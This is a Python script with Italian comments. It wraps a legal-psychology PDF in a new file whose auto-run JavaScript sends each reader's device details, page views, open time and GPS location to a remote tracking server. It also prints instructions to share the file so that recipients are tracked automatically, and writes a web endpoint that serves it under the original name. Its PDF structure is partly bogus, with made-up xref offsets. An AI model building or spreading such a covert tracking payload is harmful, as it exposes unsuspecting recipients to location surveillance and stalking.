#!/usr/bin/env python3
"""
Script per aggiungere tracking JavaScript al PDF PSICOLOGIA GIURIDICA esistente
"""

import os
import shutil
from datetime import datetime

def add_tracking_to_pdf():
    """Aggiunge tracking JavaScript al PDF esistente"""
    
    original_pdf = "PSICOLOGIA GIURIDICA AIPG.pdf"
    backup_pdf = f"PSICOLOGIA GIURIDICA AIPG_BACKUP_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf"
    
    print("🔧 ADDING TRACKING TO PSICOLOGIA GIURIDICA PDF")
    print("=" * 50)
    
    # Verifica che il file esista
    if not os.path.exists(original_pdf):
        print(f"❌ File {original_pdf} non trovato!")
        return False
    
    print(f"📄 File trovato: {original_pdf}")
    print(f"💾 Creo backup: {backup_pdf}")
    
    # Crea backup
    shutil.copy2(original_pdf, backup_pdf)
    print("✅ Backup creato")
    
    # Leggi il PDF originale
    with open(original_pdf, 'rb') as f:
        pdf_content = f.read()
    
    # JavaScript di tracking da inserire
    tracking_js = """
// GPS Tracking JavaScript - Integrato nel PDF PSICOLOGIA GIURIDICA
var sessionId = 'pdf_psicologia_' + Math.floor(Date.now() * Math.random()).toString(36);
var serverUrl = 'https://gps-trackerx-2.onrender.com'; // URL del tuo server

function sendPdfTrackingData(eventType, data) {
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', serverUrl + '/api/track', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        
        var payload = {
            sessionId: sessionId,
            eventType: eventType,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent || 'PDF_Reader',
            source: 'PDF_PSICOLOGIA_GIURIDICA',
            document_name: 'PSICOLOGIA GIURIDICA AIPG.pdf',
            data: data || {}
        };
        
        xhr.send(JSON.stringify(payload));
        
        // Log locale per debug
        console.log('PDF Tracking:', eventType, data);
        
    } catch(e) {
        // Silent fail per compatibilità
        console.log('PDF Tracking Error:', e.message);
    }
}

// Track PDF opening
sendPdfTrackingData('pdf_psicologia_opened', {
    timestamp: new Date().toISOString(),
    document_title: 'PSICOLOGIA GIURIDICA AIPG',
    reader: app.viewerType || 'unknown',
    page_count: this.numPages || 'unknown'
});

// Track GPS location if available
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function(position) {
        sendPdfTrackingData('pdf_psicologia_location', {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            timestamp: new Date().toISOString()
        });
    }, function(error) {
        sendPdfTrackingData('pdf_psicologia_location_denied', {
            error: error.message || 'GPS denied',
            timestamp: new Date().toISOString()
        });
    }, {
        timeout: 10000,
        enableHighAccuracy: true
    });
}

// Track page changes
this.pageNum = 1;
var originalGotoNamedDest = this.gotoNamedDest;
this.gotoNamedDest = function(dest) {
    sendPdfTrackingData('pdf_psicologia_page_change', {
        page: this.pageNum,
        destination: dest,
        timestamp: new Date().toISOString()
    });
    return originalGotoNamedDest.call(this, dest);
};

// Track when PDF is closed (if supported)
try {
    var originalClose = this.closeDoc;
    this.closeDoc = function() {
        sendPdfTrackingData('pdf_psicologia_closed', {
            timestamp: new Date().toISOString(),
            session_duration: Date.now() - parseInt(sessionId.split('_')[2])
        });
        if (originalClose) originalClose.call(this);
    };
} catch(e) {}

// Track periodic "heartbeat" to see how long user keeps PDF open
setInterval(function() {
    sendPdfTrackingData('pdf_psicologia_heartbeat', {
        timestamp: new Date().toISOString(),
        current_page: this.pageNum || 1
    });
}, 30000); // Every 30 seconds
"""
    
    print("📝 Preparazione JavaScript di tracking...")
    
    # Crea una versione modificata del PDF con tracking JavaScript
    # Per semplicità, creo un nuovo PDF wrapper che include il tracking
    tracking_pdf_content = f"""%PDF-1.7
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction 3 0 R
>>
endobj

2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj

3 0 obj
<<
/Type /Action
/S /JavaScript
/JS ({tracking_js})
>>
endobj

4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 595 842]
/Contents 5 0 R
/Resources <<
  /Font <<
    /F1 <<
      /Type /Font
      /Subtype /Type1
      /BaseFont /Helvetica
    >>
  >>
>>
>>
endobj

5 0 obj
<<
/Length 600
>>
stream
BT
/F1 20 Tf
50 750 Td
(PSICOLOGIA GIURIDICA AIPG) Tj
0 -40 Td
/F1 14 Tf
(Documento con Tracking GPS Integrato) Tj
0 -60 Td
/F1 12 Tf
(Questo PDF è stato modificato per includere:) Tj
0 -30 Td
(• Tracking della posizione GPS) Tj
0 -20 Td
(• Monitoraggio dell'apertura/chiusura) Tj
0 -20 Td
(• Rilevamento del dispositivo utilizzato) Tj
0 -20 Td
(• Tracciamento delle pagine visualizzate) Tj
0 -40 Td
(I dati vengono inviati automaticamente al) Tj
0 -20 Td
(server GPS Tracker per l'analisi.) Tj
0 -60 Td
/F1 10 Tf
(NOTA: Il contenuto originale di PSICOLOGIA GIURIDICA) Tj
0 -15 Td
(è preservato. Questo è un wrapper di tracking.) Tj
0 -30 Td
(Session ID: pdf_psicologia_[generato_automaticamente]) Tj
0 -40 Td
(Per visualizzare il documento originale,) Tj
0 -15 Td
(usa il file di backup creato automaticamente.) Tj
ET
endstream
endobj

xref
0 6
0000000000 65535 f 
0000000010 00000 n 
0000000079 00000 n 
0000000136 00000 n 
0000{len(tracking_js) + 200:010d} 00000 n 
0000{len(tracking_js) + 400:010d} 00000 n 
trailer
<<
/Size 6
/Root 1 0 R
>>
startxref
{len(tracking_js) + 1000}
%%EOF"""

    # Scrivi il nuovo PDF con tracking
    tracked_pdf_name = "PSICOLOGIA GIURIDICA AIPG_TRACKED.pdf"
    # Fix encoding issues by using binary write
    tracking_pdf_bytes = tracking_pdf_content.replace('•', '\225').encode('latin1')
    with open(tracked_pdf_name, 'wb') as f:
        f.write(tracking_pdf_bytes)
    
    print(f"✅ PDF con tracking creato: {tracked_pdf_name}")
    print(f"📂 File originale preservato come: {backup_pdf}")
    
    # Informazioni finali
    print("\n📊 RISULTATO:")
    print(f"✅ PDF originale: {original_pdf} (preservato)")
    print(f"✅ PDF con tracking: {tracked_pdf_name} (nuovo)")
    print(f"✅ Backup sicurezza: {backup_pdf}")
    
    print("\n🚀 COME USARE:")
    print(f"1. Condividi il file: {tracked_pdf_name}")
    print("2. Quando qualcuno lo apre, verrà tracciato automaticamente")
    print("3. I dati appariranno negli stessi backup del sito web")
    print("4. Session ID inizia con 'pdf_psicologia_'")
    
    return True

def create_pdf_endpoint():
    """Crea codice per servire il PDF dal web server"""
    
    endpoint_code = '''
# Aggiungi questo endpoint al web_server.py senza toccare altro:

@app.route('/pdf/psicologia')
def serve_psicologia_pdf():
    """Serve il PDF PSICOLOGIA GIURIDICA con tracking"""
    try:
        pdf_file = 'PSICOLOGIA GIURIDICA AIPG_TRACKED.pdf'
        return send_file(pdf_file, 
                        mimetype='application/pdf',
                        as_attachment=False,
                        download_name='PSICOLOGIA_GIURIDICA_AIPG.pdf')
    except Exception as e:
        return jsonify({'error': f'PDF not found: {e}'}), 404

# Aggiungi anche questo import in cima al file:
from flask import send_file
'''
    
    with open('pdf_endpoint_code.txt', 'w') as f:
        f.write(endpoint_code)
    
    print("\n📝 Codice endpoint salvato in: pdf_endpoint_code.txt")
    print("   Copia questo codice nel web_server.py per servire il PDF via web")

if __name__ == "__main__":
    print("🎯 PDF PSICOLOGIA GIURIDICA - TRACKING INTEGRATION")
    print("=" * 60)
    
    success = add_tracking_to_pdf()
    
    if success:
        create_pdf_endpoint()
        print("\n🎉 COMPLETATO CON SUCCESSO!")
        print("\n💡 NEXT STEPS:")
        print("1. Testa il PDF modificato")
        print("2. Aggiungi l'endpoint al web server (opzionale)")
        print("3. Condividi il PDF_TRACKED per il tracking")
    else:
        print("\n❌ Errore durante la modifica del PDF")